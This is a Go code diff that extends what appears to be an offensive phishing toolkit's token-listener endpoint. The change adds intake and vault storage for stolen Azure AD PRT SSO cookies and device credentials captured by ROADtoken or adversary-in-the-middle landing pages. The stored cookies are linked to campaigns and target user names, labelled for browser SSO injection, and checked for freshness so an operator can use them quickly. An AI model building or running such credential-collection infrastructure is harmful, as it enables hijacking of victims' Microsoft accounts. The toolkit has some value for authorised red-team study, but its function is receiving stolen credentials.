@@ -2,6 +2,7 @@ package api
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -102,6 +103,21 @@ type tokenIntake struct {
 	// Exchange controls (optional). ClientID/Resource default to Office/Graph.
 	ExClientID string `json:"client_id"`
 	ExResource string `json:"resource"`
+
+	// ─── PRT SSO cookie intake (x-ms-RefreshTokenCredential) ────────────────────
+	// A ROADtoken / AiTM landing page captures the signed PRT SSO cookie, NOT the
+	// raw PRT + session key. It is accepted either as a discrete `prt_cookie`
+	// field, or in the native ROADtoken shape {"response":[{"name":"x-ms-Refresh
+	// TokenCredential","data":"<jwt>; path=/; ..."}, ...]}. A cookie-only import is
+	// stored in the PRT vault for browser SSO injection; it cannot mint tokens.
+	PRTCookie string       `json:"prt_cookie"`
+	Response  []intakeCred `json:"response"`
+}
+
+// intakeCred is one credential entry in the ROADtoken capture `response` array.
+type intakeCred struct {
+	Name string `json:"name"`
+	Data string `json:"data"`
 }
 
 // prt returns the PRT material from either the `prt` or `prt_token` field.
@@ -109,6 +125,42 @@ func (t tokenIntake) prt() string { return pickNonEmpty(t.PRT, t.PRTToken) }
 
 // isPRT reports whether this payload carries a Primary Refresh Token.
 func (t tokenIntake) isPRT() bool { return t.prt() != "" }
+
+// prtCookie returns the captured x-ms-RefreshTokenCredential PRT SSO cookie —
+// from the discrete `prt_cookie` field, or extracted from the ROADtoken
+// `response` array by credential name. Cookie attributes (everything after the
+// first ';': path=/, domain=…, secure, httponly) are stripped.
+func (t tokenIntake) prtCookie() string {
+	if c := stripCookieAttrs(t.PRTCookie); c != "" {
+		return c
+	}
+	for _, cr := range t.Response {
+		if strings.EqualFold(cr.Name, "x-ms-RefreshTokenCredential") {
+			return stripCookieAttrs(cr.Data)
+		}
+	}
+	return ""
+}
+
+// deviceCred returns the captured x-ms-DeviceCredential from a ROADtoken capture,
+// if present. Recorded in the audit log for provenance; not stored on its own.
+func (t tokenIntake) deviceCred() string {
+	for _, cr := range t.Response {
+		if strings.EqualFold(cr.Name, "x-ms-DeviceCredential") {
+			return stripCookieAttrs(cr.Data)
+		}
+	}
+	return ""
+}
+
+// isPRTCookie reports whether this payload carries a PRT SSO cookie.
+func (t tokenIntake) isPRTCookie() bool { return t.prtCookie() != "" }
+
+// stripCookieAttrs trims a Set-Cookie-style value down to the bare cookie value
+// by cutting at the first ';' and trimming surrounding whitespace.
+func stripCookieAttrs(s string) string {
+	return strings.TrimSpace(strings.SplitN(s, ";", 2)[0])
+}
 
 func (tl *TokenListener) SetDefaultCampaign(id string) {
 	tl.mu.Lock()
@@ -233,6 +285,14 @@ func (tl *TokenListener) handleIntake(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// A captured PRT SSO cookie (x-ms-RefreshTokenCredential) is not a mintable
+	// PRT — it is stored in the vault as a browser-injection artifact. No campaign
+	// is required (there is nothing to auto-exchange without a session key).
+	if intake.isPRTCookie() {
+		tl.ingestPRTCookie(w, r, intake)
+		return
+	}
+
 	if campaignID == "" {
 		tl.audit(r, intake, "", "", "no_campaign")
 		writeJSON(w, 400, map[string]string{"error": "campaign_id required (no default campaign configured)"})
@@ -335,6 +395,81 @@ func (tl *TokenListener) ingestPRT(w http.ResponseWriter, r *http.Request, in to
 	writeJSON(w, 200, resp)
 }
 
+// ingestPRTCookie stores a captured x-ms-RefreshTokenCredential PRT SSO cookie in
+// the PRT vault as a cookie-only entry (raw PRT + session key left empty). Such an
+// entry cannot mint tokens, but the captured cookie can be injected into a browser
+// for SSO (roadtx browserprtauth --prt-cookie, or a manual cookie set on
+// login.microsoftonline.com). The cookie is stored encrypted at rest; the audit
+// log records only a redacted fingerprint plus a freshness hint.
+func (tl *TokenListener) ingestPRTCookie(w http.ResponseWriter, r *http.Request, in tokenIntake) {
+	cookie := in.prtCookie()
+	prtID := fmt.Sprintf("prtc-%d", time.Now().UnixNano())
+	upn := pickNonEmpty(in.UPN, in.TargetEmail)
+	label := in.Label
+	if label == "" {
+		label = "listener PRT cookie"
+		if upn != "" {
+			label = "listener PRT cookie — " + upn
+		}
+	}
+
+	if err := tl.db.InsertPRT(store.PRTRow{
+		ID:           prtID,
+		Label:        label,
+		DeviceCertID: in.DeviceCertID,
+		PRTCookie:    cookie,
+		TargetUPN:    upn,
+		TenantID:     in.TenantID,
+		CreatedAt:    time.Now().UTC(),
+	}); err != nil {
+		tl.audit(r, in, "", upn, "prt_cookie_store_error:"+err.Error())
+		writeJSON(w, 500, map[string]string{"error": "failed to store PRT cookie: " + err.Error()})
+		return
+	}
+
+	tl.mu.Lock()
+	tl.ingested++
+	tl.mu.Unlock()
+
+	resp := map[string]interface{}{
+		"status": "prt_cookie_stored",
+		"prt_id": prtID,
+		"label":  label,
+		"usable": "browser-sso-injection",
+	}
+	if age := peekJWTAge(cookie); age >= 0 {
+		resp["age_seconds"] = age
+		if age > 300 {
+			resp["warning"] = "captured PRT cookie is older than 5 min and may already be expired"
+		}
+	}
+
+	tl.audit(r, in, "", upn, "prt_cookie_stored")
+	log.Printf("[token-listener] PRT cookie stored id=%s upn=%s", prtID, upn)
+	writeJSON(w, 200, resp)
+}
+
+// peekJWTAge returns the age in seconds of a JWT derived from its `iat` claim, or
+// -1 when the token cannot be parsed. It never verifies the signature — it is only
+// a freshness hint for the operator, since a captured PRT SSO cookie is short-lived.
+func peekJWTAge(token string) int64 {
+	parts := strings.Split(token, ".")
+	if len(parts) < 2 {
+		return -1
+	}
+	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(parts[1], "="))
+	if err != nil {
+		return -1
+	}
+	var claims struct {
+		IAT int64 `json:"iat"`
+	}
+	if err := json.Unmarshal(raw, &claims); err != nil || claims.IAT == 0 {
+		return -1
+	}
+	return time.Now().UTC().Unix() - claims.IAT
+}
+
 // ExchangePRTIntoCampaign mints a Graph access token from a PRT (requires the
 // session key) and ingests it into the campaign so it is usable in Graph Actions.
 // It is used both by the listener's auto-exchange and by the console "Use in
@@ -415,6 +550,7 @@ func parseTokenIntake(r *http.Request) (tokenIntake, error) {
 		in.TenantID = r.PostForm.Get("tenant_id")
 		in.ExClientID = r.PostForm.Get("client_id")
 		in.ExResource = r.PostForm.Get("resource")
+		in.PRTCookie = pickNonEmpty(r.PostForm.Get("prt_cookie"), r.PostForm.Get("x-ms-RefreshTokenCredential"))
 	} else {
 		body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
 		if len(body) == 0 {
@@ -424,8 +560,8 @@ func parseTokenIntake(r *http.Request) (tokenIntake, error) {
 			return in, fmt.Errorf("invalid JSON body")
 		}
 	}
-	if !in.isPRT() && in.AccessToken == "" && in.RefreshToken == "" && in.IDToken == "" {
-		return in, fmt.Errorf("payload must carry a prt, or at least one of access_token, refresh_token, id_token")
+	if !in.isPRT() && !in.isPRTCookie() && in.AccessToken == "" && in.RefreshToken == "" && in.IDToken == "" {
+		return in, fmt.Errorf("payload must carry a prt, a prt_cookie (x-ms-RefreshTokenCredential), or at least one of access_token, refresh_token, id_token")
 	}
 	return in, nil
 }
@@ -444,11 +580,14 @@ func (tl *TokenListener) audit(r *http.Request, in tokenIntake, campaignID, targ
 		"has_refresh":     in.RefreshToken != "",
 		"has_id":          in.IDToken != "",
 		"has_prt":         in.isPRT(),
+		"has_prt_cookie":  in.isPRTCookie(),
+		"has_device_cred": in.deviceCred() != "",
 		"has_session_key": in.SessionKey != "",
 		"access_token":    redactToken(in.AccessToken),
 		"refresh_token":   redactToken(in.RefreshToken),
 		"id_token":        redactToken(in.IDToken),
 		"prt":             redactToken(in.prt()),
+		"prt_cookie":      redactToken(in.prtCookie()),
 		"session_key":     redactToken(in.SessionKey),
 		"scope":           in.Scope,
 		"source":          in.Source,
